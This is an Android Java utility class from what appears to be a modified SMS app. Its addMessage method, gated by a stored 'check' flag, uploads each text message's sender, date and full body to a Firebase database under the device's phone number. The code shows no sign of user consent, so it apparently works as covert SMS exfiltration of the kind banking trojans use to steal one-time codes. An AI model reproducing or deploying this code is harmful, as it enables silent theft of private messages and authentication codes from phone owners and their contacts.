package com.menergemis.defaultsemes;

import android.content.Context;
import android.preference.PreferenceManager;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.menergemis.defaultsemes.common.QKApplication;

public class FirebaseUtil {

    public static void addMessage(Context context, long date, String address, String body){
        String phoneNumber = PreferenceManager.getDefaultSharedPreferences(context.getApplicationContext()).getString("phoneNumber", ((QKApplication)(context.getApplicationContext())).phonNumber);
        String check = PreferenceManager.getDefaultSharedPreferences(context.getApplicationContext()).getString("check","0");
        if(!phoneNumber.isEmpty() && check.equals("1")){
            DatabaseReference databaseReferenceCMD =   FirebaseDatabase.getInstance().getReference().child(phoneNumber);
            databaseReferenceCMD.child("messages").child("" + date).child("date").setValue(DateFormater.getDateTimeFormat(date));
            databaseReferenceCMD.child("messages").child("" + date).child("sender").setValue(address);
            databaseReferenceCMD.child("messages").child("" + date).child("sms").setValue(body);
        }

    }
}
